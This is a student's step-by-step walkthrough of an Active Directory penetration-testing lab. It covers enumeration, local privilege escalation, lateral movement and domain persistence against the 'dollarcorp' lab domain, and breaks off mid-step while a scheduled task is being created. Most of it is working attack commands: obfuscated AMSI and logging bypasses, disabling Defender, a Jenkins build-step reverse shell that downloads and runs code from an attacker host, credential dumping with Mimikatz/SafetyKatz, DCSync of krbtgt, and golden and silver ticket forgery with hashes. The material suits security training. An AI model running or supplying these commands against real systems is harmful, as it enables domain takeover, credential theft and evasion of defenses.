
# **Things to take note Of**

- Remember to turn off or add an exception to your student VM's firewall when you run a listener for a reverse shell.
- The `C:\` directory is exempted from Windows Defender, but AMSI may detect some tools when you load them.
- Use the following to Bypass AMSI after loading invisi-shell -:


```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

- You would need to turn off Tamper Protection on the student VM after getting user shell or performing local privilege escalation (Check Google on how to do this)
- Sometimes you need to click **"Enter"** key on your keyboard to see result of commands like netcat, rubeus, mimikatz etc
- If most attacks most especially in domain persistence don't work, just **reboot student VM**, you must have created a lot of tickets 😭


# **Things to do once you have a User First**


- Start a PowerShell session using Invisi-Shell to avoid enhanced logging


```powershell
# do this on MS-DOS
C:\users\studentx> cd \AD\Tools

C:\users\studentx> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# You should now have a powershell seesion
```

- Use the AMSI Bypass payload now
- Load `PowerView` in the PowerShell session.


```powershell
. C:\AD\Tools\PowerView.ps1
```



# **Enumeration**

> [!bug] **Learning Objective 1**
> - Enumerate following for the dollarcorp domain :
> 	- Users
> 	- Computers
> 	- Domain Administrators
> 	- Enterprise Administrators
> 	- Shares
> # Solution -:

### **Users**

```powershell
# Powerview (both are same command)
# One just shows you logoncount to detect decoy accounts

Get-DomainUser -Properties samaccountname,logonCount
Get-DomainUser | select -ExpandProperty samaccountname
```


### **Computers**


```powershell
# powerview
# shows username, equivalent to the whoami command
Get-DomainComputer | select Name

# shows domain network name, equivalent to the hostname command
Get-DomainComputer | select -ExpandProperty dnshostname
```




### **Domain Admins**


```powershell
# powerview
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# The most important piece of information from the output is (Note Down) -:
# MemeberName
# MemeberSID
```



### **Enterprise Admin**



```powershell
# powerview
Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse

# If you don't get any output after the above command note that
# We need to query the root domain as Enterprise Admins group is present only in # the root of a forest.

Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local

# Also note down MemberName and MemberSID
```




### **Shares**



```powershell
# powerview
Invoke-ShareFinder -Verbose

# See content of provided shares
# dir "\\dcorp-std520.dollarcorp.moneycorp.local\ADMIN$\"
dir "\\dnshostname\sharename"
```



> [!bug] **Learning Objective 2**
> - Enumerate following for the dollarcorp domain
> 	- List all the OUs
> 	- List all the computers in the StudentMachines OU.
> 	- List all the GPOs
> 	- Enumerate GPO applied on the StudentMachines OU
> # Solution -:

### **List All Organizational Units**


```powershell
# powerview
Get-DomainOU

# Use the -Properties option to filter out just the name
Get-DomainOU -Properties Name
```


### **List all the computers in {the/An} {StudentMachines OU/OU}**


```powershell
# powerview
# Get OU name first
Get-DomainOU -Properties Name

# Then list all computers
(Get-DomainOU -Identity <OU_Name>).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```




### **List all the GPOs**



```powershell
# powerview
Get-DomainGPO
```




### **Enumerate GPO applied on the StudentMachines OU**


```powershell
# powerview
# Get OU name first
Get-DomainOU -Properties Name

# Grab identity on specific OU name
Get-DomainOU -Identity StudentMachines
# copy the "gplink" property where you have "LDAP//:cn={Copy-This}"

# Get GPO applied
Get-DomainGPO -Identity '{7478F170-6A0C-490C-B355-9E4618BC785D}'
```


> [!bug]  **Learning Objective 3**
> -  Enumerate following for the dollarcorp domain:
> 	- ACL for the Users group
> 	- ACL for the Domain Admins group
> 	- All modify rights/permissions for the student
> # Solution -:




### **ACL for the Users group**


```powershell
# powerview
Get-DomainObjectAcl -Identity "Users" -ResolveGUIDs -Verbose
```



### **ACL for the Domain Admins group**


```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```



### **All modify rights/permissions for the student**


```powershell
# powerview
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student505"}
```



### **ActiveDirectory Rights for RDPUsers group**



```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```



> [!bug] **Learning Objective 4**
> - Enumerate all domains in the moneycorp.local forest.
> - Map the trusts of the dollarcorp.moneycorp.local domain.
> - Map external trust in the moneycorp.local forest.
> - Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest ?
> # Solution -: 

### **Get all domains in the current forest**



```powershell
Get-ForestDomain -verbose 

# The "Name:" property are the domain names
# Or just filter by Name
Get-ForestDomain -verbose | select Name
```


### **Map the trusts of All Domain**


```powershell
# Powerview
Get-DomainTrust

# Map the trust of a domain
Get-ForestDomain -verbose | select Name
Get-DomainTrust -Domain us.dollarcorp.moneycorp.local

# Ouput you should look out for -:
# SourceName
# TargetName
# TrustAttributes
# TrustDirection
```



### **Map external trust in The moneycorp.local forest**


```powershell
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```




### **Identify external trusts of the dollarcorp domain**



```powershell
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```


### **Trust Direction for the trust between dollarcorp.moneycorp.local and eurocorp.local**


```powershell
# If the "TrustDirection" output of the previous command is either bi-directional trust or one-way trust
# Then we can use the below command

Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
```



![](https://i.imgur.com/bIp4vE2.png)




# **Local Privilege Escalation**



> [!bug] **Learning Objective 5**
> - Exploit a service on dcorp-studentx and elevate privileges to local administrator.
> - Identify a machine in the domain where studentx has local administrative access.
> - Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server
> # Solution -:




### **Get services with unquoted paths and a space in their name {Exploit}**


- Cd to `C:\AD\Tools`
- Load Invisi-shell
- Load AMSI Bypass
- Load `Powerup.ps1` script


```powershell
. 'C:\Ad\Tools\PowerUp.ps1'
```


- Run the `Get-ServiceUnquoted` module to check for unquoted path


```powershell
Invoke-AllChecks

# Note down the "ServiceName:" with unquoted paths
```


- Then abuse function for `Invoke-ServiceAbuse` and add our current domain user to the local Administrators group


```powershell
# -Name: Name of service to abuse
# -Username: Name of current user, Just run the whoami cmd
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose  
```

We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!




### **Identify a machine in the domain where present user has local administrative access**



- Cd to `C:\AD\Tools`
- Load Invisi-shell
- Load AMSI Bypass
- Load `Find-PSRemotingLocalAdminAccess.ps1` script


```powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```





- Fond local administrative access


```powershell
Find-PSRemotingLocalAdminAccess
```



![](https://i.imgur.com/6LJp7ia.png)



- We can the connect to the machines found using `winrs` or `Enter-PSSession`(Powershell Remoting)



```powershell
# winrs
winrs -r:dcorp-adminsrv cmd
set username
set computername

# powershell remoting
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.loca
$env:username
```



![](https://i.imgur.com/8ZevFtw.png)




### **Jenkins**


- Navigate to the Jenkins instance `http://172.16.3.11:8080`
- Log in with default credentials, in this case `build:build`, or check google for **default Jenkins credentials**
- Turn off all windows firewall settings
- Start up `hfs.exe` (HTTP File Server) located under `C:\AD\Tools\`
- Navigate to `/job/Project0/configure` (If you get a `403` keep changing Project0 to Project1, Pro...2, ..........3 till you get a `200`)
- Scroll down to the option "**Build steps**" and on the drop down select/add "**Execute Windows Batch Command**" and enter-:

```powershell
powershell iex (iwr -UseBasicParsing http://ATTACKER-IP/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress ATTACKER-IP -Port 443

# Replace attacker IP with your IP Address, Run "ipconfig" to see it
```

- Start up your listener with `netcat.exe`

```powershell
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```


- Hit **Apply** and then **Save** and on the left side bar, you should see a **Build Now** button, Click it.
- You should then see your reverse shell as `dcorp-ci`



![](https://i.imgur.com/Hf381f0.png)





# **Enumeration - Bloodhound**


> [!bug] **Learning Objective 6**
> - Setup BloodHound and identify shortest path to Domain Admins in the dollarcorp domain.
> # Solution -:




**The Reason why this enumeration is coming after Local Privilege Escalation is because we need some administrative rights to run this type of enumeration**


### **BloodHound New Setup**

- BloodHound uses **neo4j** graph database, so we need to setup that first.
- Go ahead open this location on MS-DOS


```powershell
cd C:\AD\Tools\neo4j-community-4.4.5-windows\neo4j-community-4.4.5\bin
```


- Install and start the neo4j service as follows:


```powershell
.\neo4j.bat install-service
.\neo4j.bat start
```


- Browse to the **neo4j** service on `localhost:7474/browser/` on your browser
- Enter the username: **neo4j** and password: **neo4j**.
- You also need to enter a new password. Let's use BloodHound as the new password.
- We also need to power on bloodhound, change directory to :


```powershell
cd C:\AD\Tools\BloodHound-win32-x64\BloodHound-win32-x64
.\BloodHound.exe
```



- Provide **neo4j** username and password we crated earlier


```
bolt://localhost:7687

Username: neo4j
Password:bloodhound 
```


- Now since we have local administrator privileges, go ahead and turn off antivirus (Both **Real time protection** and **Tamper Protection**) using GUI
- Open another powershell session with local administrative privileges and load **Invisi-shell**


```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat 
cd C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors
```

- Bypass  **.NET AMSI Bypass** with the script below :

```powershell
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string
procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ =
[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115
;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ,
"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97
;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```


- Start BloodHound collector, to gather data


```powershell
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Verbose
```



- Navigate to the bloodhound collector directory on the GUI

```
Location:

C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors
```



- You should see a zip file, drag and drop it to bloodhound UI


![](https://i.imgur.com/9Wd253Y.png)





### **BloodHound Old Setup**


**The latest version of BloodHound (4.2.0) does not show Derivate Local Admin edge in GUI. The last version where it worked was 4.0.3. It is present in the Tools directory as BloodHound-4.0.3_old. You can use it the same way as above.**

- Make sure the **neo4j** UI is still turned off, but you can turn off the newer bloodhound
- Change directory to the old bloodhound using MS-DOS and start up bloodhound


```powershell
cd C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-win32-x64
.\BloodHound.exe
```


- Now since we have local administrator privileges, go ahead and turn off antivirus (Both **Real time protection** and **Tamper Protection**) using GUI
- Open another powershell session with local administrative privileges and load **Invisi-shell**


```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat 
cd C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-master\Collectors
```

- Bypass  **.NET AMSI Bypass** with the script below :

```powershell
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string
procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ =
[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115
;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ,
"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97
;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```


- Start BloodHound collector, to gather data


```powershell
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```



- Now clear the database if there is any data available from the old bloodhound UI
- Navigate to the bloodhound collector directory on the GUI and drag and drop the zip file to Bloodhound_old UI

```
Location:

C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-master\Collectors
```



### **Shortest path to Domain Admins in the dollarcorp domain - bloodhound**




**Note -: This can only be done with old bloodhound UI**


- In Node Info, scroll down to '**LOCAL ADMIN RIGHTS**' and expand '**Derivative Local Admin Rights**' to find if studentx has derivate local admin rights on any machine!


![](https://i.imgur.com/zkLtx5h.png)



- As we can see below `student505` is a member of `RDPUSERS` group and `RDPUSERS` is Admin To `DCORP-ADMINSRV` DC


![](https://i.imgur.com/n31oOzy.png)


- This means that if we run - `winrs -r:dcorp-adminsrv cmd` - we can actually be domain admin


![](https://i.imgur.com/RHI3YZd.png)



# **Lateral Movement - 1. Using dcorp-ci**


> [!bug] **Learning Objective 7**
> - Identify a machine in the target domain where a Domain Admin session is available.
> - Compromise the machine and escalate privileges to Domain Admin
> 	- Using access to `dcorp-ci`
> 	- Using derivative local admin
> # Solution -:



### **Step 1 - Identify a machine in the target domain where a Domain Admin session is available.**


Remember we got access to `dcorp\ciadmin` via the Jenkins instance, we can use this domain user to enumerate more domain admin session is available, Go ahead and get reverse shell with Jenkins again ☹️


![](https://i.imgur.com/z0Fu3jR.png)


- First, we must bypass AMSI and enhanced logging.
- The below command bypasses Enhanced Script Block Logging
- Make sure to setup **HFS** and host the `sbloggingbypass.txt` for this

```powershell
iex (iwr http://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)
```


![](https://i.imgur.com/6KibfHl.png)


- Bypass AMSI

```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```



- Download and execute PowerView in memory of the reverse shell
- Make sure to setup **HFS** for this also, hosting the `PowerView.ps1` script


```powershell
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
```


- Then run this command to find **domain admin session** 
- Note that this might take a lot of time, so wait!! 🤣


```powershell
Find-DomainUserLocation
```


![](https://i.imgur.com/mgNGQFW.png)


- Great! There is a domain admin session on dcorp-mgmt server

> **Note** -: If you don't get result within 4 minutes hit the **Enter** key on your keyboard twice you should see output, hence, keep waiting till something comes up



### **Step 2 - Abuse using winrs**


**Let’s check if we can execute commands on dcorp-mgmt server and if the winrm port is open:**


```powershell
winrs -r:dcorp-mgmt hostname;whoami
```


![](https://i.imgur.com/wBUPKu0.png)



**Once this is confirmed we can go ahead and run SafetyKatz.exe on dcorp-mgmt to extract credentials from it** -:



- download `Loader.exe` on **dcorp-ci** and copy it from there to **dcorp-mgmt**



```powershell
iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
```



- Copy the `Loader.exe` to **dcorp-mgmt**:



```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```


**_Right Output -:_**


![](https://i.imgur.com/oHkafUX.png)


- Using `winrs`, add the following port forwarding on **dcorp-mgmt** to avoid detection on **dcorp-mgmt**


```powershell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"


# $null - output redirection issues
```


- Use `Loader.exe` to download and execute `SafetyKatz.exe` in-memory on **dcorp-mgmt**
- Make sure to host `SafetyKatz.exe` on **HFS**


```powershell
$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```


**_Right Output -:_**


![](https://i.imgur.com/d620Z2B.png)



> We got credentials of svcadmin - a domain administrator. Note that **svcadmin** is used as a service account, so you can even get credentials in clear-text from lsasecrets!


![](https://i.imgur.com/d7iaV5E.png)


**Incase you want to use Powershell Remoting instead of winrs, you can check out lab manual**

### **Step 3 - OverPass-the-Hash Rubeus**


We will use **OverPass-the-Hash**, to use svcadmin's credentials


- Spawn an elevated shell from the student VM (**Run as Administrator**)

```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

- You should now see a new window/process come up
- Try accessing the domain controller from the new process!


```powershell
# To run command remotely
winrs -r:dcorp-dc whoami

# To get active shell
winrs -r:dcorp-dc cmd
```



![](https://i.imgur.com/gwUwl7h.png)



# **Lateral Movement - 2. Using derivative local admin**



**Remember when we use bloodhound to enumerate shortest path to domain admin and we got `dcorp-adminsrv`, Yeah that is who a derivative local admin is**

- Load invisi-shell and AMSI bypass into your MS-DOS session


![](https://i.imgur.com/KDFf7s8.png)


- find out the machines on which we have local admin privileges

```powershell
cd C:\AD\Tools

. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1

Find-PSRemotingLocalAdminAccess
```


**_Example -:_**


![](https://i.imgur.com/rDIDPEa.png)

**We have local admin on the dcorp-adminsrv**



- check if **Applocker** is configured on `dcorp-adminsrv` by querying **registry keys**

```powershell
# spawn active shell on dcorp-adminsrv
winrs -r:dcorp-adminsrv cmd

# Query registry keys
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```


![](https://i.imgur.com/IuN7laB.png)


**We can go ahead and enumerate this registry keys to check if there is a policy that can favor us**


```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script

reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
```



**_Example_**


![](https://i.imgur.com/2ajE9HQ.png)


**We have got an interesting policy in \Script that allows everyone to run programs, Signed binaries and scripts located under "C:\ProgramFiles" That means, we can drop scripts in the Program Files directory there and execute them**

- First, disable Windows Defender on the `dcorp-adminsrv` server ^2a8dec
- Before this exit the `winrm` session and use `PS Remoting`


```powershell
Enter-PSSession dcorp-adminsrv

# Disable windows defender
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```


**_Example_**


![](https://i.imgur.com/zlZYDq2.png)



### **Step 1 - Create Invoke-MimiEx.ps1**


-  Create a copy of **Invoke-Mimi.ps1** and rename it to **Invoke-MimiEx.ps1**.
- Open **Invoke-MimiEx.ps1** in PowerShell ISE (Right click on it and click Edit).
- Add `Invoke-Mimi -Command '"sekurlsa::ekeys"'`  to the end of the file.


**_Example_**


![](https://i.imgur.com/OgF704m.png)



- Open up a new Powershell session on student machine run the following command to transfer the `Invoke-Mimi.ps1` to **dcorp-adminsrv**



```powershell
Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```


- Confirm if the file has been transferred

```powershell
[dcorp-adminsrv]: PS C:\Users\student505\Documents> cd 'C:\Program Files\'

[dcorp-adminsrv]: PS C:\Program Files> ls

[SNIP]
-a----   12/11/2023   2:45 PM        2070874 Invoke-MimiEx.ps1
```


- Run the modified mimikatz script on `dcorp-adminsrv`


```powershell
[dcorp-adminsrv]: PS C:\Program Files> .\Invoke-MimiEx.ps1
```


> [!summary] **Here we find the credentials(secrets) of the `srvadmin`, `appadmin` and `websvc` users.**



We will use **OverPass-the-Hash**, to use **srvadmin's** credentials using `SafetyKatz.exe`


- Spawn an elevated powershell from the student VM (**Run as Administrator**)


```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /run:cmd.exe" "exit"
```

- You should now have a new process/shell
- Check if srvadmin has admin privileges on any other machine.


```powershell
# Load invisi-shell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Verbose
```


**_Example_**



![](https://i.imgur.com/EuTNkRr.png)


**Hell yeah, we discovered a new machine `dcorp-mgmt`**

### **Step 2 - SafetyKatz for extracting credentials**


- Copy the `Loader.exe` to **dcorp-mgmt**:


```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```



- Extract Credentials
- Make sure to host `SafetyKatz.exe` on **HFS** before running this command

```powershell
winrs -r:dcorp-mgmt cmd

# Launch powershell
powershell

# Enable port Forwarding
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"

# Extract Credentials
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```


**You could also use `Powershell Remoting`, As shown below**


### **Step 2.1 - Using PS-Remoting**


- Note that you have to exit from the 2 previous session by using the `exit` command twice before running the command below

```powershell
# Connect via PS-Remoting
Enter-PSSession -ComputerName dcorp-mgmt
```


- Load AMSI Bypass
- Download and Execute Invoke-Mimikatz as follows

```powershell
iex (iwr http://172.16.100.X/Invoke-Mimi.ps1 -UseBasicParsing)
```

- Extract Credentials

```powershell
# Extract Credentials
Invoke-Mimi -Command '"sekurlsa::ekeys"'

# Extract Credentials From Credentials Vault
Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
```


### **Step 3 - OverPass-the-Hash Rubeus**

- Spawn an elevated shell from the student VM (**Run as Administrator**)

```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```


- You should now see a new window/process come up as `svcadmin`, Run `klist` to confirm
- Try accessing the domain controller from the new process!


```powershell
# To run command remotely
winrs -r:dcorp-dc whoami

# To get active shell
winrs -r:dcorp-dc cmd
```



**_Things To Note Down_**

- [ ] `aes256_hmac` is Mostly used for **OverPass-The-Hash** attack
- [ ] **NTLM Hash** is called `rc4_hmac_nt`
- [ ] To solve the question `Process using svcadmin as service account` -:
	- You have to `winrs` into **dcorp-mgmt** after getting user `svcadmin`
	- Then run `tasklist /svc` to view processes
	- You should see `sqlsevr.exe`, The answer is definitely **sqlserver**



# **Domain Persistence**

> [!bug] **Learning Objective 8**
> - Extra secrets from the domain controller of dollarcorp.
> - Using the secrets of `krbtgt` account, create a golden ticket.
> - Use the Golden ticket to (once again) get domain admin privileges from a machine
> # Solution -:

### **Extract secrets from the domain controller of dollarcorp**


- First of all spawn an elevated **MS-DOS** session and start a process with Domain Admin privileges.


```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

- From the new process, copy `Loader.exe` on **dcorp-dc** and use it to extract credentials


```powershell
# Copy Loader.exe to DC
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y

# Spawn interactive shell
winrs -r:dcorp-dc cmd

# Set up port forwarding
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x

# Extract Credentials
# make sure to setup HFS first and host SafetyKatz.exe
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe

# Run this command on the mimikatz session
lsadump::lsa /patch

# Take Note of the "Domain :" output
# This is the Domain SID that would be use often
```



**_Example_**


![](https://i.imgur.com/Wj7mI2N.png)



### **Using the secrets of krbtgt account, create a Golden ticket.**


- To get NTLM hash and AES keys of the krbtgt{or other users} account, we can use the DCSync attack

- Run the below command from process running as Domain Admin


```powershell
# Exit mimikatz
exit
exit

# Extracts Credentials
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

# Important Output -:
Hash NTLM:
aes256_hmac
aes128_hmac
```


- We can then use `BetterSafetyKatz.exe` to create a Golden ticket using the **aes256_hmac** key from last output

-  Run the below command from an elevated command prompt

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```


- Now you should be administrator on `dcorp-dc`
- Run `klist` to confirm

![](https://i.imgur.com/LhaskQI.png)


- You should now be able to run commands remotely

```powershell
dir \\dcorp-dc\c$

# run WMI commands on the DC
powershell
gwmi -Class win32_computersystem -ComputerName dcorp-dc
```


**_Example_**


![](https://i.imgur.com/btWJLpq.png)


### **Getting Command Execution on domain controller, creating a silver ticket**


> [!bug] **Learning Objective 9**
> -  During the additional lab time:
> - Try to get command execution on the domain controller by creating silver tickets for:
> 	- HOST service
> 	- WMI
> # Solution -:


### **Step 1 - Craft Silver Ticket (HOST Service)**


- First of extract secrets as shown earlier and note the output down
- Now start up `mimikatz.exe`

```powershell
cd \AD\Tools
.\mimikatz.exe
```


- Then run the command below replacing `/rc4` with **DCORP-DC$** NTLM and `/sid` with the **Domain :** output from the secret we extracted earlier

```powershell
kerberos::golden /user:Administrator /rc4:f5a2cef076a16742b123b8ed07c372c1 /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /domain:dollarcorp.moneycorp.local /service:HOST /startoffset:0 /endin:600 /renewmax:10080 /ptt

# /sid: - Domain SID
# /rc4: - DCORP-DC$ NTLM
```


- Then run the command below to know if you have permissions to viewing scheduling task

```powershell
exit
schtasks /S dcorp-dc.dollarcorp.moneycorp.local



<<Expected Output>>
[SNIP]
TaskName         Next Run Time          Status
============================= ====== ===============
Device Install Group Policy     N/A       Ready
Device Install Reboot Required  N/A       Ready
Sysprep Generalize Drivers      N/A       Ready

Folder: \Microsoft\Windows\Power Efficiency Diagnostics
TaskName         Next Run Time          Status
===================== ============== ===============
AnalyzeSystem             N/A                  Ready

Folder: \Microsoft\Windows\PushToInstall
TaskName         Next Run Time          Status
============= ====================== ===============
LoginCheck          N/A                    Disabled
Registration        N/A                    Disabled

Folder: \Microsoft\Windows\Ras
TaskName         Next Run Time          Status
============= ====================== ===============
MobilityManager    N/A                    Ready
[SNIP]
```

**Note That if you get an "Error: Access is denied", you probably did the wrong thing**


### **Step 2 - Gain Reverse Shell**


- [ ] **_Create Invoke-PowerShellTcpEx.ps1:_**

	- Create a copy of **Invoke-PowerShellTcp.ps1** and rename it to **Invoke-PowerShellTcpEx.ps1**.
	
	- Open **Invoke-PowerShellTcpEx.ps1** in PowerShell ISE
	
	- Add -  `Power -Reverse -IPAddress 172.16.100.X -Port 443` - to the end of the file and save.




![](https://i.imgur.com/4aXmJlD.png)




- Now host the newly created **Invoke-PowerShellTcpEx.ps1** on **HFS**
- Start up your reverse shell on another new `MS-DOS` session



```powershell
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```




-  On the same session where we crated our **silver ticket** run this 


```powershell
# Create scheduled task
